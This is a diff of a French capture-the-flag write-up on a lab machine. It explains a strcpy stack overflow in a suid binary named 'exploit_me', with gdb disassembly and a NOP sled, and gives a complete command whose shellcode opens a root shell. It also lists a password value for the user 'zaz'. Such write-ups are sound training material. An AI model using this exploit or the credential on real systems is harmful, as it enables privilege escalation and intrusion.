@@ -284,9 +284,15 @@ A la fin du fichier "turtle" il y a une phrase "Can you digest the message? :)" 
 zaz : 646da671ca01bb5d84dbb5fb2238dc8e
 
 
-Une fois connecté avec zaz, on peut voir un fichier binaire "exploit_me", ce que nous allons nous empresser de faire ;)
-Apres tests et analyses on peut voir que "exploit_me" utilise un buffer fixe que nous allons remplir a fond. Ensuite on indique une adresse memoire (aleatoire.
-Et pour finir, une commande shellcode qui execute /bin/sh en tant que root:
+Une fois connecté avec zaz, on peut voir un fichier binaire "exploit_me". Avec un ls -l on peut voir que le fichier est suid, et que donc il se lance avec
+des permissions élevées. Avec gdb on peut disas main et on voit:
+   0x080483fa <+6>:	sub    esp,0x90
+ainsi que:
+   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
+On voit donc un strcpy appelé dans un buffer fixe de 140 bytes sur la stack. On peut donc proceder a un buffer overflow.
+La sauvegarde d'eip (adresse ou le processeur va sauter en sortant de la fonction) est située juste apres ce buffer. On peut donc faire jump le programme la ou on le desire.
+On genère un shellcode avec peda qu'on push sur la stack, et on tente de jump dessus. Par chance, l'executable a été compilé avec --execstack, ainsi on peut éxécuter notre shellcode :)
+On ajoute une plage de \x90 (instructions NOP) afin de faciliter le jump (NOP sled).
 
   ----------------------------------------------------------------------------------------
 ./exploit_me $(python -c "print 'A'*140 + '\xac\xf4\xff\xbf' + '\x90'*500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'")
